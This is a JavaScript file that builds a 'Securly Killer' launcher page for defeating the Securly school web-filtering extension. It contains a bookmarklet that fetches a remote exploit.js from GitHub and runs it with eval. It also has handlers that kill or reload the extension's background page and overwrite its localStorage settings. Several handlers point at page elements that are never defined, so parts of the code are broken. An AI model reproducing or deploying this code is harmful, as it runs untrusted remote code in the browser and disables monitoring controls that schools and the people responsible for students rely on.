function aboutBlankPage(url){
  opener.chrome.tabs.query({url:url},(x)=>{
    opener.chrome.tabs.update(x[0].id,{url:"about:blank"});
  })
};

function get(id){
  return window.document.getElementById(id)
};

doc = window.document;

doc.write(`
<html>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cutive+Mono&family=Open+Sans:wght@300&display=swap');
  
    html, body {
      height: 100%;
      width: 100%;
      text-align: center;
    }


    
    h1, h2 {
      font-family: "Cutive Mono", sans-serif;
    }
    p {
      font-size: 16;
      font-family: "Open Sans", sans-serif;
    }
    button {
      outline: 0;
      align-items: center;
      background-color: #FFFFFF;
      border: 1px solid rgba(0, 0, 0, 0.1);
      border-radius: .25rem;
      box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
      box-sizing: border-box;
      color: rgba(0, 0, 0, 0.85);
      cursor: pointer;
      display: inline-flex;
      font-family: "Open Sans", sans-serif;
      font-size: 16px;
      font-weight: 600;
      justify-content: center;
      line-height: 1.25;
      margin: 0;
      min-height: 3rem;
      padding: calc(.875rem - 1px) calc(1.5rem - 1px);
      position: relative;
      text-decoration: none;
      transition: all 250ms;
      user-select: none;
      -webkit-user-select: none;
      touch-action: manipulation;
      vertical-align: baseline;
      width: auto;
      color: black;
    }

    #code {
      background-color: lightgray; border-radius: 5px;
    } /*span element*/
    
    button:hover,
    button:focus {
      border-color: rgba(0, 0, 0, 0.15);
      box-shadow: rgba(0, 0, 0, 0.1) 0 4px 12px;
      color: rgba(0, 0, 0, 0.65);
    }
    
    button:hover {
      transform: translateY(-1px);
    }
    
    button:active {
      background-color: #F0F0F1;
      border-color: rgba(0, 0, 0, 0.15);
      box-shadow: rgba(0, 0, 0, 0.06) 0 2px 4px;
      color: rgba(0, 0, 0, 0.65);
      transform: translateY(0);
    }
    input {
      outline: 0;
      align-items: center;
      background-color: #FFFFFF;
      border: 1px solid rgba(0, 0, 0, 0.1);
      border-radius: .25rem;
      box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
      box-sizing: border-box;
      color: rgba(0, 0, 0, 0.85);
      display: inline-flex;
      font-family: "Open Sans", sans-serif;
      font-size: 16px;
      font-weight: 600;
      justify-content: center;
      line-height: 1.25;
      margin: 0;
      min-height: 3rem;
      padding: calc(.875rem - 1px) calc(1.5rem - 1px);
      position: relative;
      text-decoration: none;
      user-select: none;
      -webkit-user-select: none;
      touch-action: manipulation;
      vertical-align: baseline;
      width: auto;
    }
    
    #eee {
      cursor: pointer;
      text-decoration: underline; 
      color: #242526;
    }
    
    #links {
      display: none;
      font-family: 'Open Sans', sans-serif; 
      color: gray;
    }

    a {
      color: gray;
      text-decoration: none;
    }

    #container {
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      position: fixed;
      white-space: nowrap;
    }
    
  </style>
  
  <body><div id="container">
    <center><h1>Point Blank Swap Launcher</h1></center>

    <h2>――――――Securly Killer ――――――</h2>
    
  <div class="bookmarklet">
        <h3>Securly Killer</h3>
       
        <a class="button" href="javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);">Securly Killer</a>
      </div>
    <h2>――― Change tab URL (about:blank) ―――</h2>
    <input id='url'>
    <button  id='change'>Change tabs (Useless)</button>
    <p id='error'></p>
    <button  id='reload'>Reload extension (Useless)</button>
    <br>
    <p><i>this strictily for removing securly</i></p>
  </div></body>
</html>
`);
try {
console.log(get('hardkill'));
get('hardkill').addEventListener('click', function() {try{opener.chrome.extension.getBackgroundPage().close();alert('Killed background process')}catch(e){alert(e);}}, false);
} catch(e) {
    alert(e);
}
get('change').addEventListener('click', function(){
    const url = get('url').value;
    aboutBlankPage(url);
}, false);

get('cachekill').addEventListener('click', function (){
    if (confirm("Reverting hard kill sometimes can fail. Use with caution.\nPress Ok to continue, cancel to cancel")){
    localStorage.cluster='UNKNOWN_SCHOOL, 999999999999999999999999999';
    opener.chrome.extension.getBackgroundPage().location.reload();
    alert('Cache changed');}
}, false);

get('hardkillrev').addEventListener('click', function (){
    localStorage.cluster='UNKNOWN_SCHOOL,0';
    opener.chrome.runtime.reload();
    alert('Reverted cache');
}, false);

get('reload').addEventListener('click', function(){
    try {
        opener.chrome.extension.getBackgroundPage().location.reload();
        alert('Reloaded');
    } catch(e) {
        alert('Failed to reload: '+e);
    }
}, false);

get('eee').addEventListener('click', function(){
    const x = get('links');
  
    if (x.style.display == "none") {
      x.style.display = "block";
    } else {
      x.style.display = "none";
    }
}, false);
